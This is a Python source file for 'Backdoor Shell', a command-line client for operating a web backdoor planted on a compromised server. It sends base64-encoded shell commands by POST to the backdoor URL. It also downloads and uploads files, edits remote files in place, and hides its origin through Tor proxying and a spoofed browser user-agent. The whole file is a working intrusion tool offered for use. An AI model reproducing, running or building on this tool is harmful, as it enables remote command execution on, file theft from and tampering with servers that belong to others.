# -*- coding: utf-8 -*-
"""Backdoor Shell"""
import argparse
import base64
import io
import logging
import os
import random
import string
import subprocess
import sys
import tempfile
from cmd import Cmd
from typing import Optional, Sequence, Union

import requests

try:
    import readline
except ImportError:
    readline = None

__version__ = '0.1.3'
__author__ = 'Sergey M <tz4678@gmail.com>'
__description__ = __doc__

BANNER = r"""
 ____             _     ____  _          _ _
| __ )  __ _  ___| | __/ ___|| |__   ___| | |
|  _ \ / _` |/ __| |/ /\___ \| '_ \ / _ \ | |
| |_) | (_| | (__|   <  ___) | | | |  __/ | |
|____/ \__,_|\___|_|\_\|____/|_| |_|\___|_|_|
v{} by tz4678

Type '?' or 'help' for more information.
""".format(
    __version__
)

EDITOR = os.environ.get('EDITOR', 'vim')

HISTFILE = os.path.expanduser('~/.backshell_history')
HISTFILE_SIZE = 1000


PROXY_MAPPING = {'tor': 'socks5://localhost:9050'}


def rand_chars(
    length: int = 8, chars: str = string.ascii_letters + string.digits
) -> str:
    return ''.join(random.choice(chars) for _ in range(length))


class BackShell(Cmd):
    intro = BANNER
    prompt = 'backshell> '

    def __init__(
        self,
        url: str,
        *,
        cwd: Optional[str] = None,
        nohistory: bool = False,
        proxy: Optional[str] = None,
        session: Optional[requests.Session] = None,
        useragent: Optional[str] = None,
    ) -> None:
        super().__init__()
        self.url = url
        self.cwd = cwd
        self.nohistory = nohistory
        if not session:
            session = requests.session()
        if useragent:
            session.headers.update({'User-Agent': useragent})
        if proxy:
            proxy = PROXY_MAPPING.get(proxy, proxy)
            session.proxies.update({'http': proxy, 'https': proxy})
        self.session = session

    def emptyline(self) -> None:
        pass

    def do_exit(self, line: str) -> bool:
        "exit"
        return True

    def do_quit(self, line: str) -> bool:
        "exit"
        return self.do_exit(line)

    def do_q(self, line: str) -> bool:
        "exit"
        return self.do_exit(line)

    def do_EOF(self, line: str) -> bool:
        "exit"
        return self.do_exit(line)

    def do_myip(self, line: str) -> None:
        # Если передается UA, похожий на браузерный, то отдается html
        r = self.session.get(
            'http://ifconfig.me', headers={'User-Agent': 'curl/x.x.x'}
        )
        print(r.text)

    def exploit(self, command: str) -> str:
        redirect = '2>&1'
        # BAD: nohup command & 2>&1
        # GOOD: nohup command 2>&1 &
        if command.endswith('&'):
            command = command[:-1] + redirect + ' &'
        else:
            command += ' ' + redirect
        if self.cwd:
            command = 'cd {}; '.format(self.cwd) + command
        logging.debug(command)
        encoded = base64.b64encode(command.encode()).decode()
        try:
            r = self.session.post(self.url, {'c': encoded})
            return r.text
        except Exception as ex:
            logging.error(ex)

    def download(self, path: str, file: io.TextIOBase) -> int:
        encoded = self.exploit('base64 {!r}'.format(path))
        contents = base64.b64decode(encoded)
        try:
            return file.write(contents)
        finally:
            file.flush()

    def do_download(self, arg: str) -> None:
        "download file from server"
        filename = '{}.{}'.format(rand_chars(4), os.path.basename(arg))
        with open(filename, 'wb') as f:
            try:
                self.download(arg, f)
                print('Saved as', filename)
            except Exception as ex:
                logging.error(ex)

    def upload(self, contents: Union[bytes, str], path: str) -> str:
        "upload local file to server"
        if isinstance(contents, str):
            contents = contents.encode()
        encoded = base64.b64encode(contents).decode()
        result = self.exploit(
            'echo {!r} | base64 -d > {}'.format(encoded, path)
        )
        return result

    def do_upload(self, arg: str) -> None:
        "upload local file to server"
        filename = os.path.expanduser(arg)
        with open(filename, 'rb') as fp:
            contents = fp.read()
        output = self.upload(contents, os.path.basename(filename))
        print(output)

    def do_edit(self, arg: str) -> None:
        "edit file on server"
        _, ext = os.path.splitext(arg)
        with tempfile.NamedTemporaryFile(suffix=ext, delete=False) as temp:
            # скачиваем файл
            self.download(arg, temp)
            mt = os.stat(temp.fileno()).st_mtime
            # редактируем
            subprocess.call([EDITOR, temp.name])
            # если время модфикации файла не изменилось не гоняем лишние байты
            # по сети
            if os.stat(temp.fileno()).st_mtime > mt:
                temp.seek(0)
                contents = temp.read()
                # загружаем на сервер
                output = self.upload(contents, arg)
                print(output)
            else:
                print('Not modified')
            os.unlink(temp.name)

    def do_cdx(self, arg: str) -> None:
        "fixed cd"
        self.cwd = arg

    def default(self, command: str) -> None:
        print(self.exploit(command))

    def preloop(self) -> None:
        if not self.nohistory and readline and os.path.exists(HISTFILE):
            readline.read_history_file(HISTFILE)

    def postloop(self) -> None:
        if not self.nohistory and readline:
            readline.set_history_length(HISTFILE_SIZE)
            readline.write_history_file(HISTFILE)


def main(argv: Sequence[str] = sys.argv[1:]) -> None:
    parser = argparse.ArgumentParser(
        description=__description__,
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument('url', help='backdoor url')
    parser.add_argument(
        '-d',
        '--debug',
        action='store_true',
        default=False,
        help='show more verbose output',
    )
    parser.add_argument(
        '-c', '--command', '--cmd', help='execute one command and exit',
    )
    parser.add_argument(
        '--cwd', help='change working directory',
    )
    parser.add_argument(
        '--nohistory',
        '--nohist',
        action='store_true',
        default=False,
        help='no save history',
    )
    parser.add_argument(
        '--useragent',
        '--ua',
        default='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.50',
        help='user agent',
    )
    parser.add_argument(
        '--proxy',
        help='proxy, eg.: "socks5://localhost:9050" or simple "tor"',
    )
    parser.add_argument(
        '-v', '--version', action='version', version='v{__version__}'
    )
    args = parser.parse_args(argv)
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.WARNING,
        stream=sys.stderr,
    )
    if readline is None:
        logging.warning('readline not available')
    sh = BackShell(
        args.url,
        cwd=args.cwd,
        nohistory=args.nohistory,
        proxy=args.proxy,
        useragent=args.useragent,
    )
    if args.command:
        sh.onecmd(args.command)
    else:
        sh.cmdloop()
